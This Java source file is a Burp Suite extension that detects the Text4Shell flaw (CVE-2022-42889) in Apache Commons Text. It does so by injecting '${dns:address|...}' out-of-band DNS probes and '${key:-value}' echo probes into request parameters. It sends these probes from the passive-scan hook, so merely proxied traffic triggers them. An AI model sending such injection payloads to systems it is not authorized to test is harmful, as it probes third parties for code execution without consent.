package burp;

import org.apache.commons.lang3.RandomStringUtils;

import java.io.PrintWriter;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;

import static java.lang.Thread.sleep;

public class BurpExtender implements IBurpExtender, IScannerCheck {
    private String extensionName = "T4scan";
    private String version = "v0.0.1";
    private PrintWriter stdout;
    private PrintWriter stderr;
    private IBurpExtenderCallbacks callbacks;
    private IExtensionHelpers helpers;

    @Override
    public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
        this.callbacks = callbacks;
        callbacks.setExtensionName(extensionName + "@" + version);
        callbacks.registerScannerCheck(this);
        helpers = callbacks.getHelpers();
        stdout = new PrintWriter(callbacks.getStdout(), true);
        stderr = new PrintWriter(callbacks.getStderr(), true);
        stdout.println("success loaded");
    }

    @Override
    public List<IScanIssue> doPassiveScan(IHttpRequestResponse baseRequestResponse) {

        byte[] baseRequest = baseRequestResponse.getRequest();
        IRequestInfo requestInfo = helpers.analyzeRequest(baseRequestResponse);
        stdout.println("passive scan: " + requestInfo.getUrl());

        List<IScannerInsertionPoint> insertionPoints = new ArrayList<>();
        List<IParameter> parameters = requestInfo.getParameters();
        for (IParameter parameter : parameters) {
            IScannerInsertionPoint insertionPoint = helpers.makeScannerInsertionPoint(parameter.getName(),
                    baseRequest,
                    parameter.getValueStart(),
                    parameter.getValueEnd());
            insertionPoints.add(insertionPoint);
        }

        for (IScannerInsertionPoint insertionPoint : insertionPoints) {
            Runnable dns = new CheckDNS(baseRequestResponse, requestInfo, insertionPoint);
            dns.run();
        }

        String key1 = RandomStringUtils.random(5, true, true);
        String value1 = RandomStringUtils.random(5, true, true);
        String key2 = RandomStringUtils.random(5, true, true);
        String value2 = RandomStringUtils.random(5, true, true);
        String inject = String.format("${%s:-%s}${%s:-%s}", key1, value1, key2, value2);
        String pattern = String.format("%s%s", value1, value2);

        for (IScannerInsertionPoint insertionPoint : insertionPoints) {

            byte[] rawRequest = insertionPoint.buildRequest(inject.getBytes());
            Runnable rawEcho = new CheckEcho(baseRequestResponse, requestInfo, rawRequest, pattern.getBytes());
            rawEcho.run();

            byte[] encodedInject;
            try {
                encodedInject = URLEncoder.encode(inject, "UTF-8").getBytes();
            } catch (Exception e) {
                throw new RuntimeException(e);
            }

            byte[] encodedRequest = insertionPoint.buildRequest(encodedInject);
            Runnable encodedEcho = new CheckEcho(baseRequestResponse, requestInfo, encodedRequest, pattern.getBytes());
            encodedEcho.run();
        }
        return null;
    }

    @Override
    public List<IScanIssue> doActiveScan(IHttpRequestResponse baseRequestResponse, IScannerInsertionPoint insertionPoint) {
        return null;
    }

    @Override
    public int consolidateDuplicateIssues(IScanIssue existingIssue, IScanIssue newIssue) {
        return 0;
    }

    // helper method to search a response for occurrences of a literal match string
    // and return a list of start/end offsets
    private List<int[]> getMatches(byte[] response, byte[] match) {
        List<int[]> matches = new ArrayList<int[]>();

        int start = 0;
        while (start < response.length) {
            start = helpers.indexOf(response, match, true, start, response.length);
            if (start == -1)
                break;
            matches.add(new int[]{start, start + match.length});
            start += match.length;
        }

        return matches;
    }

    class CheckDNS implements Runnable {
        IHttpRequestResponse baseRequestResponse;
        IRequestInfo requestInfo;
        IScannerInsertionPoint insertionPoint;

        public CheckDNS(IHttpRequestResponse baseRequestResponse, IRequestInfo requestInfo, IScannerInsertionPoint insertionPoint) {
            this.baseRequestResponse = baseRequestResponse;
            this.requestInfo = requestInfo;
            this.insertionPoint = insertionPoint;
        }

        @Override
        public void run() {
            IBurpCollaboratorClientContext context = callbacks.createBurpCollaboratorClientContext();
            String payload = context.generatePayload(true);
            String inject = String.format("${dns:address|%s}",payload);
            byte[] request = insertionPoint.buildRequest(inject.getBytes());
            IHttpService httpService = baseRequestResponse.getHttpService();
            IHttpRequestResponse requestResponse = callbacks.makeHttpRequest(httpService, request);
            byte[] encodedInject;
            try {
                encodedInject = URLEncoder.encode(inject, "UTF-8").getBytes();
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
            request = insertionPoint.buildRequest(encodedInject);
            IHttpRequestResponse encodedRequestResponse = callbacks.makeHttpRequest(httpService, request);

            try {
                sleep(10000);
                List<IBurpCollaboratorInteraction> interactions = context.fetchCollaboratorInteractionsFor(payload);
                if (interactions.size() > 0) {
                    IScanIssue iScanIssue = new CustomScanIssue(httpService,
                            requestInfo.getUrl(),
                            new IHttpRequestResponse[]{requestResponse, encodedRequestResponse},
                            "text4shell",
                            "CVE-2022-42889, aka “Text4Shell”, is a vulnerability in the popular Java library “Apache Commons Text” which can result in arbitrary code execution when processing malicious input.",
                            "High");
                    callbacks.addScanIssue(iScanIssue);
                }
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
        }
    }


    class CheckEcho implements Runnable {
        IHttpRequestResponse baseRequestResponse;
        IRequestInfo requestInfo;
        byte[] request;
        byte[] pattern;

        public CheckEcho(IHttpRequestResponse baseRequestResponse, IRequestInfo requestInfo, byte[] request, byte[] pattern) {
            this.baseRequestResponse = baseRequestResponse;
            this.requestInfo = requestInfo;
            this.request = request;
            this.pattern = pattern;
        }

        @Override
        public void run() {
            IHttpService httpService = baseRequestResponse.getHttpService();
            IHttpRequestResponse requestResponse = callbacks.makeHttpRequest(httpService, request);
            List<int[]> matches = getMatches(requestResponse.getResponse(), pattern);
            if (matches.size() > 0) {
                IScanIssue iScanIssue = new CustomScanIssue(httpService,
                        requestInfo.getUrl(),
                        new IHttpRequestResponse[]{callbacks.applyMarkers(requestResponse, null, matches)},
                        "text4shell",
                        "CVE-2022-42889, aka “Text4Shell”, is a vulnerability in the popular Java library “Apache Commons Text” which can result in arbitrary code execution when processing malicious input.",
                        "High");
                callbacks.addScanIssue(iScanIssue);
            }
        }
    }

    class CustomScanIssue implements IScanIssue {
        private IHttpService httpService;
        private URL url;
        private IHttpRequestResponse[] httpMessages;
        private String name;
        private String detail;
        private String severity;

        public CustomScanIssue(
                IHttpService httpService,
                URL url,
                IHttpRequestResponse[] httpMessages,
                String name,
                String detail,
                String severity) {
            this.httpService = httpService;
            this.url = url;
            this.httpMessages = httpMessages;
            this.name = name;
            this.detail = detail;
            this.severity = severity;
        }


        @Override
        public URL getUrl() {
            return url;
        }

        @Override
        public String getIssueName() {
            return name;
        }

        @Override
        public int getIssueType() {
            return 0;
        }

        @Override
        public String getSeverity() {
            return severity;
        }

        @Override
        public String getConfidence() {
            return "Certain";
        }

        @Override
        public String getIssueBackground() {
            return null;
        }

        @Override
        public String getRemediationBackground() {
            return null;
        }

        @Override
        public String getIssueDetail() {
            return detail;
        }

        @Override
        public String getRemediationDetail() {
            return null;
        }

        @Override
        public IHttpRequestResponse[] getHttpMessages() {
            return httpMessages;
        }

        @Override
        public IHttpService getHttpService() {
            return httpService;
        }
    }
}
